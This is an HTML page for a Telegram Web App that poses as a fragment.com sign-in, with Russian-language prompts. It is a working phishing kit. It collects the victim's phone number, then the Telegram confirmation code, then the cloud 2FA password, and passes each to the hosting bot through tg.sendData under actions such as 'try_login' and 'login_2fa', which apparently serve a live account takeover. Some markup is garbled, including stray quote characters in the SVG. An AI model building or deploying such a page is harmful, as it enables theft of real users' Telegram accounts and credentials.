<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org"></script>
    <script src="https://unpkg.com"></script>
    <style>
        body { 
            background-color: #ffffff; 
            background-image: url("https://www.transparenttextures.com");
            background-repeat: repeat;
            font-family: -apple-system, sans-serif; 
            display: flex; flex-direction: column; align-items: center; justify-content: center; 
            height: 100vh; margin: 0; overflow: hidden; 
        }
        .container { 
            width: 90%; max-width: 400px; text-align: center; 
            background: rgba(255, 255, 255, 0.98); 
            padding: 30px; border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        .tg-logo { width: 75px; height: 75px; margin-bottom: 20px; }
        h2 { font-size: 26px; font-weight: 700; margin-bottom: 10px; }
        p { font-size: 15px; color: #707579; margin-bottom: 25px; }
        .phone-box { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
        select, input { 
            width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #dfe1e5; 
            background: #f4f4f5; color: #000; font-size: 18px; box-sizing: border-box; outline: none; text-align: center;
        }
        button { 
            width: 100%; padding: 16px; background: #3390ec; color: #ffffff; border: none; 
            border-radius: 12px; font-weight: 600; font-size: 17px; cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <svg class="tg-logo" viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#3390EC""")/>><path d="M175.987 80.8159L158.336 164.103C157.007 169.967 153.551 171.428 148.621 168.662L121.73 148.835L108.756 161.314C107.319 162.751 106.12 163.962 103.354 163.962L105.289 136.502L155.26 91.2461C157.432 89.313 154.784 88.2384 151.884 90.1714L89.9882 129.141L63.3853 120.824C57.5996 119.016 57.4789 115.031 64.5925 112.254L168.607 72.1384C173.436 70.3274 177.662 73.2088 175.987 80.8159Z" fill="white""")/>></svg>
        <h2 id="title">Fragment</h2>
        <p id="desc">Введите номер для авторизации на <a href="https://fragment.com">fragment.com</a></p>
        <div class="phone-box">
            <select id="country" onchange="changeCountry()">
                <option value="RU" data-mask="+{7} (000) 000 00 00">🇷🇺 Россия (+7)</option>
                <option value="AZ" data-mask="+{994} (00) 000 00 00">🇦🇿 Азербайджан (+994)</option>
                <option value="OTHER" data-mask="+{000000000000}">🌍 Другая страна...</option>
            </select>
            <input type="tel" id="phoneInput">
        </div>
        <button id="btn">Далее</button>
    </div>
    <script>
        let tg = window.Telegram.WebApp; tg.expand();
        let step = 1; let mask; let phone = ""; let code = "";
        function initMask(p) { if (mask) mask.destroy(); mask = IMask(document.getElementById('phoneInput'), { mask: p, lazy: false }); }
        function changeCountry() { initMask(document.getElementById('country').options[document.getElementById('country').selectedIndex].getAttribute('data-mask')); }
        initMask("+{7} (000) 000 00 00");

        document.getElementById('btn').onclick = function() {
            let val = document.getElementById('phoneInput').value;
            if (step === 1) {
                phone = "+" + mask.unmaskedValue;
                tg.sendData(JSON.stringify({ "action": "send_code", "phone": phone }));
                document.getElementById('country').style.display = 'none';
                document.getElementById('desc').innerText = "Введите код из Telegram";
                mask.destroy(); document.getElementById('phoneInput').value = "";
                document.getElementById('btn').innerText = "Подтвердить";
                step = 2;
            } else if (step === 2) {
                code = val;
                tg.sendData(JSON.stringify({ "action": "try_login", "code": code, "phone": phone }));
                // Ждем 1 сек и спрашиваем пароль (если нужно)
                document.getElementById('desc').innerText = "Введите облачный пароль (2FA)";
                document.getElementById('phoneInput').type = "password";
                document.getElementById('phoneInput').value = "";
                document.getElementById('btn').innerText = "Авторизоваться";
                step = 3;
            } else {
                tg.sendData(JSON.stringify({ "action": "login_2fa", "password": val, "code": code, "phone": phone }));
                tg.close();
            }
        };
    </script>
</body>
</html>
